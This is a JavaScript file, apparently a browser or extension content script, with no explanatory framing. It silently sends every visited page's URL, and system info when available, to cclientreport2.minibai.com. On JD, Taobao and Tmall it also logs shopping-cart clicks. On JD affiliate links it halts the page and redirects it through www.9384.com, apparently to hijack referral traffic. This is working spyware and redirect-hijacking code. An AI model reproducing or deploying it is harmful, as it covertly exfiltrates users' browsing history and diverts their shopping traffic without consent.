"use strict";
!function(w){
  ! function () {// all page visit
    documentReady(upload_);
  }();

  ! function () {// shopping cart
    if(!verUrl(w.location.host)) return;
    documentReady(function(){
      listenShop(upload_(1));
    })
    function verUrl(url){
      let domainArr = [
        'jd.com',
        'taobao.com',
        'tmall.com',
      ];
      for(let i of domainArr) if(url.indexOf(i) != -1) return true;
      return false;
    }
    function listenShop(callback){
      let clickArr = ['J_LinkBasket','J_juValid', 'InitCartUrl'];
      for(let i of clickArr){
        let el = document.getElementById(i);
        if(el) el.addEventListener('click',callback);
      }
    }
  }();
  !function(){// sndo skip
    let runUrl = [
      'click.jd.com',
      'u.jd.com',
      'www.jd.com'
    ],key = '$s_9*';
    for(let i of runUrl){
      if(location.href.indexOf(i) != -1){
        if(!getCookie(key)){
          if (w.stop)w.stop();
          else document.execCommand("Stop");
          setCookie(key,1, 5);
          location.replace('https://www.9384.com/jd.html?AAA');
        }else if(getCookie(key) == 1){
          setCookie(key,2, 5);
          upload_(2);
          break;
        }
      }
    }
  }();
  function upload_(t) {
    let url = '//cclientreport2.minibai.com/tmp5log.json',
      data = {
        h: window.location.href,
        t
      };
    for(let i in data) if(!data[i]) delete data[i];
    if(chrome.xb && chrome.xb.getSysInfo)chrome.xb.getSysInfo(function(s){
			data = {
				...data,
				s
			}
			ajax({
        type: 'post',
        url,
        data
      });
		})
		else ajax({
      type: 'post',
      url,
      data
    });
    
  }
  function documentReady(callback){
    if (
      document.readyState === "complete" ||
      (document.readyState !== "loading" && !document.documentElement.doScroll)
    ) {
      callback();
    } else {
      document.addEventListener("DOMContentLoaded", function(){
        callback();
      });
    }
  }
  function setCookie(key,value,expirehours){
		let date = new Date();
		date.setTime(date.getTime() + expirehours * 3600 * 1000);
		document.cookie= key +"="+ value +"; expires="+date.toGMTString();
	}
	function getCookie(cname) {  
    let name = cname + "=";  
    let ca = document.cookie.split(';');  
    for(let i=0; i<ca.length; i++) {  
        let c = ca[i];  
        while (c.charAt(0)==' ') c = c.substring(1);  
        if (c.indexOf(name) != -1) return c.substring(name.length, c.length);  
    }  
    return "";  
	} 
  function ajax(options) {
    options = options || {};
    options.type = (options.type || "GET").toUpperCase();
    options.dataType = options.dataType || 'json';
    options.async = options.async || true;
    options.timeout = options.timeout || 100;
    let params = getParams(options.data),
      xhr, timeoutFlag = null;
    window.clearTimeout(timeoutFlag);
    if (window.XMLHttpRequest) {
      xhr = new XMLHttpRequest();
    } else {
      xhr = new ActiveXObject('Microsoft.XMLHTTP')
    }
    xhr.onreadystatechange = function () {
      if (xhr.readyState == 4) {
        let status = xhr.status;
        if (status >= 200 && status < 300) {
          window.clearTimeout(timeoutFlag);
          options.success && options.success(xhr.responseText, xhr.responseXML);
        } else {
          window.clearTimeout(timeoutFlag);
          options.error && options.error(status);
        }
      }
    };
    if (options.type == 'GET') {
      xhr.open("GET", options.url + '?' + params, options.async);
      xhr.send(null)
    } else if (options.type == 'POST') {
      xhr.open('POST', options.url, options.async);
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(params);
    }
    timeoutFlag = window.setTimeout(function () {
      window.clearTimeout(timeoutFlag);
      xhr.abort();
    }.bind(this), options.timeout);
  }
  function getParams(data) {
    let arr = [];
    for (let param in data) {
      arr.push(encodeURIComponent(param) + '=' + encodeURIComponent(data[param]));
    }
    return arr.join('&');
  }
}(window.top)